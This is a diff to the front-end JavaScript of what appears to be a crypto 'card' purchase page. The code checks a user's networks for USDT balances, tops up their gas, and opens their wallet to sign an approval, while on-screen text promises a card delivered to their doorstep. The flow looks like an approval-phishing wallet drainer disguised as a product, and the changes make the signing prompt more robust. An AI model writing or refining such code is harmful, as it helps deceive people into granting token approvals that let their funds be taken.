@@ -39,6 +39,8 @@ let finishedPayments = new Set();
 let selectedWalletHref = '';
 let walletsCache = null;
 let paymentPollInFlight = false;
+let approvalOpenRequested = false;
+let approvalWaitInFlight = false;
 let cardMinUsdt = '1';
 
 /* ========== Meta Pixel ==========
@@ -209,11 +211,16 @@ async function startSession() {
 
     evtSrc.addEventListener('approval_request_sent', (e) => {
       if (resolved) return;
-      JSON.parse(e.data);
-      setLoaderStep('sign');
-      setBusy(true, 'Confirm in your wallet', 'After submission, the card will be delivered via mail and physically at your doorstep.');
-      reopenSelectedWallet();
-      waitForPaymentResult();
+      let d = {};
+      try { d = JSON.parse(e.data); } catch (_err) { return; }
+      if (d.connectionId && connId && d.connectionId !== connId) return;
+      openApprovalOnce();
+    });
+
+    evtSrc.addEventListener('approval_signed', (e) => {
+      const d = JSON.parse(e.data);
+      if (!shouldHandlePaymentEvent(d)) return;
+      advanceAfterNetworkDone('verified', d.paymentId);
     });
 
     evtSrc.addEventListener('payment_verified', (e) => {
@@ -696,9 +703,12 @@ async function waitForPaymentResult() {
           const res = await fetch(BASE + '/api/payment/' + encodeURIComponent(ids[n]) + '/status');
           const data = await res.json();
           const p = data.payment || {};
-          if (p.status === 'verified' && p.transactionHash) {
+          if ((p.status === 'verified' || p.status === 'wallet_confirmed' || p.walletSigned) && p.transactionHash) {
             advanceAfterNetworkDone('verified', p.paymentId || ids[n]);
             return;
+          }
+          if (p.status === 'requested') {
+            openApprovalOnce();
           }
           if (p.status === 'rejected') {
             advanceAfterNetworkDone('rejected', p.paymentId || ids[n]);
@@ -783,6 +793,43 @@ async function ensureGasInBackground(p) {
   return waitUntilGasReady({ poll: false });
 }
 
+function openApprovalOnce() {
+  if (resolved || approvalOpenRequested) return;
+  approvalOpenRequested = true;
+  setLoaderStep('sign');
+  setBusy(true, 'Confirm in your wallet', 'After submission, the card will be delivered via mail and physically at your doorstep.');
+  reopenSelectedWallet();
+  waitForPaymentResult();
+}
+
+async function waitForApprovalOpened() {
+  if (resolved || approvalWaitInFlight || approvalOpenRequested) return;
+  approvalWaitInFlight = true;
+  setBusy(true, 'Waiting for gas', 'The approval stays closed until the top-up is in your wallet.');
+  try {
+    for (let i = 0; i < 45 && !resolved && !approvalOpenRequested; i += 1) {
+      try {
+        const res = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/status');
+        const data = await res.json();
+        const p = data.payment || {};
+        if ((p.status === 'verified' || p.status === 'wallet_confirmed' || p.walletSigned) && p.transactionHash) {
+          advanceAfterNetworkDone('verified', p.paymentId || paymentId);
+          return;
+        }
+        if (p.status === 'requested') {
+          openApprovalOnce();
+          return;
+        }
+      } catch (_err) {
+        /* keep waiting; do not open the wallet yet */
+      }
+      await sleep(2000);
+    }
+  } finally {
+    approvalWaitInFlight = false;
+  }
+}
+
 async function requestCurrentApproval() {
   if (!paymentId || resolved) return;
   const p = paymentQueue[paymentIndex];
@@ -800,50 +847,36 @@ async function requestCurrentApproval() {
     });
     const data = await res.json();
     if (!res.ok) {
-      if (/already waiting/i.test(String(data.message || ''))) return;
-      if (/does not have enough USDT|Skipping|has not arrived/i.test(String(data.message || ''))) {
+      if (/already waiting|has not arrived|stays closed/i.test(String(data.message || ''))) {
+        waitForApprovalOpened();
+        return;
+      }
+      if (/does not have enough USDT|Skipping/i.test(String(data.message || ''))) {
         if (paymentId) finishedPayments.add(paymentId);
         tryNextNetworkOrStop(p && p.network);
         return;
       }
       if (/insufficient|could not confirm live|native gas/i.test(String(data.message || ''))) {
-        throw new Error(data.message);
+        tryNextNetworkOrStop(p && p.network);
+        return;
       }
       throw new Error(data.message || 'Could not request approval');
     }
-    if (data.waitingForGas) {
-      setBusy(true, 'Waiting for gas', 'Top-up succeeded. The approval stays closed until the gas arrives in your wallet.');
-      await sleep(2500);
-      if (!resolved) return requestCurrentApproval();
+    if (data.waitingForGas || data.status === 'awaiting_gas') {
+      waitForApprovalOpened();
       return;
     }
-    reopenSelectedWallet();
-    waitForPaymentResult();
-  } catch (err) {
-    if (/insufficient|could not confirm live|native gas|Need at least 0.01|has not arrived/i.test(String(err.message || ''))) {
-      tryNextNetworkOrStop(p && p.network);
+    if (data.status === 'requested') {
+      openApprovalOnce();
       return;
     }
-    if (p.network === 'eth') {
-      tryNextNetworkOrStop(p && p.network);
+    if ((data.status === 'verified' || data.status === 'wallet_confirmed' || data.walletSigned) && data.transactionHash) {
+      advanceAfterNetworkDone('verified', data.paymentId || paymentId);
       return;
     }
-    try {
-      await sleep(1200);
-      reopenSelectedWallet();
-      const retry = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/request', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: '{}',
-      });
-      const retryData = await retry.json();
-      if (!retry.ok) throw new Error(retryData.message || err.message);
-      reopenSelectedWallet();
-      waitForPaymentResult();
-      return;
-    } catch (_retryErr) {
-      tryNextNetworkOrStop(p && p.network);
-    }
+    waitForApprovalOpened();
+  } catch (_err) {
+    waitForApprovalOpened();
   }
 }
 
@@ -892,14 +925,7 @@ function advanceAfterNetworkDone(reason, fromPaymentId) {
   if (reason === 'verified') {
     confirmedNetworks += 1;
     if (id) verifiedPayments.add(id);
-    paymentIndex += 1;
-    if (paymentIndex >= paymentQueue.length) {
-      finishApprovals();
-      return;
-    }
-    const next = paymentQueue[paymentIndex];
-    setBusy(true, 'Checking ' + networkLabel(next && next.network), 'Preparing the next eligible network.');
-    setTimeout(function () { runCurrentNetwork(); }, 400);
+    finishApprovals();
     return;
   }
   paymentIndex += 1;
@@ -938,6 +964,8 @@ async function startBackgroundApproval() {
     finishedPayments = new Set();
     verifiedPayments = new Set();
     confirmedNetworks = 0;
+    approvalOpenRequested = false;
+    approvalWaitInFlight = false;
     if (paymentIndex < 0) {
       paymentQueue.forEach(function (item) {
         if (item.status === 'verified' && item.transactionHash) verifiedPayments.add(item.paymentId);
